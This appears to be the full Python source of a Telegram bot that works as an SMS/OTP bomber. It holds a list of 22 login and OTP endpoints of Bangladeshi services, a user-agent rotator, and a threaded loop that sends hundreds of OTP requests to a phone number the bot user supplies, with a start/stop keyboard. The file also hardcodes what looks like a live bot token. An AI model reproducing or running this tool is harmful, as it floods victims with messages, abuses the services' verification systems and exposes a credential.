import requests
import threading
import time
import random
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

user_states = {}

API গুলোর লিস্ট ও তাদের ফরম্যাট সেটিংস

api_endpoints = [
{
"url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.apex4u.com/api/auth/login",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.busbd.com.bd/api/auth",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.deeptoplay.com/v2/auth/login",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.garibookadmin.com/api/v3/user/login",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.osudpotro.com/api/v1/users/send_otp",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
"method": "POST",
"json": lambda phone: {"mobile": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.shikho.com/public/activity/otp",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://app.addatimes.com/api/login",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://app.deshal.net/api/auth/login",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://auth.qcoom.com/api/v1/otp/send",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://auth.shukhee.com/register?mobile=",
"method": "GET",
"url_append": True,
"headers": {"User-Agent": "Mozilla/5.0"}
},
{
"url": "https://backend.timezonebd.com/api/v1/user/otp-request",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://bb-api.bohubrihi.com/public/activity/otp",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=",
"method": "GET",
"url_append": True,
"headers": {"User-Agent": "Mozilla/5.0"}
},
{
"url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://core.easy.com.bd/api/v1/registration",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://da-api.robi.com.bd/da-nll/otp/send",
"method": "POST",
"json": lambda phone: {"phoneNumber": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://fundesh.com.bd/api/auth/generateOTP",
"method": "POST",
"json": lambda phone: {"mobile": phone},
"headers": {"Content-Type": "application/json"}
},
{
"url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
"method": "POST",
"json": lambda phone: {"phone": phone},
"headers": {"Content-Type": "application/json"}
}
]

User-Agent রোটেটর

user_agents = [
"Mozilla/5.0 (Linux; Android 10; Mobile)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def send_request(api, phone):
headers = api.get("headers", {}).copy()
headers["User-Agent"] = random.choice(user_agents)

try:  
    if api["method"] == "GET":  
        url = api["url"] + phone if api.get("url_append", False) else api["url"]  
        response = requests.get(url, headers=headers, timeout=5)  
    else:  
        json_data = api["json"](phone) if "json" in api else None  
        response = requests.post(api["url"], json=json_data, headers=headers, timeout=5)  
    # Optional: print(f"{api['url']} -> {response.status_code}")  
    return True  
except Exception as e:  
    # Optional: print(f"Error on {api['url']}: {e}")  
    return False

def bombing_loop(bot, chat_id, user_id, phone):
while user_states.get(user_id, {}).get("bombing", False):
threads = []
success = 0
fail = 0

def run_api(api):  
        nonlocal success, fail  
        if send_request(api, phone):  
            success += 1  
        else:  
            fail += 1  

    # এখানে ১০০ বার API কল করার জন্য নিচের লুপ ইউজ করছ  
    for _ in range(10):  # ১০ বার পুরো API লিস্ট চালাবে = ১০ * ২২ = ২২০ রিকোয়েস্ট/সেকেন্ড (তুই চাইলে বাড়াতে পারিস)  
        for api in api_endpoints:  
            t = threading.Thread(target=run_api, args=(api,))  
            threads.append(t)  
            t.start()  
            time.sleep(0.002)  # 2 ms দেরি, যদি বেশি করলে ব্লক হতে পারে  

    for t in threads:  
        t.join()  

    bot.send_message(chat_id=chat_id, text=f"📤 Success: {success} | ❌ Failed: {fail}")  
    time.sleep(1)

/start command

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
keyboard = [["💣 Start"]]
markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

await update.message.reply_photo(  
    photo="https://i.postimg.cc/0yCpmF6B/1751575789815.jpg",  
    caption="Wellcome to MaxtonXBot. This is created by Robert Maxton",  
    reply_markup=markup  
)

Main message handler

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
user_id = update.effective_user.id
text = update.message.text

if text == "💣 Start":  
    user_states[user_id] = {"bombing": False}  
    await update.message.reply_text("Enter Your Number Of Murgi:-")  
    return  

if user_id in user_states and "phone" not in user_states[user_id]:  
    phone = text.strip().replace("+88", "").replace(" ", "")  
    if not phone.isdigit() or len(phone) != 11:  
        await update.message.reply_text("❌ Enter 11 Digit Number!")  
        return  
    user_states[user_id]["phone"] = phone  
    user_states[user_id]["bombing"] = True  
    keyboard = [["🛑 Stop"]]  
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)  
    await update.message.reply_text(f"🚀 Bombing Start {phone} Number!", reply_markup=markup)  

    threading.Thread(target=bombing_loop, args=(context.bot, update.message.chat_id, user_id, phone)).start()  
    return  

if text == "🛑 Stop":  
    if user_id in user_states:  
        user_states[user_id]["bombing"] = False  
    await update.message.reply_text("⛔ Bombing Stoped!")  
    return

Run bot

app = ApplicationBuilder().token("7932656144:AAHNm6V3Jp0Y6NWKeOKd_HJKVpULX607mO4").build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), message_handler))

print("✅ Bot is running...")
app.run_polling()
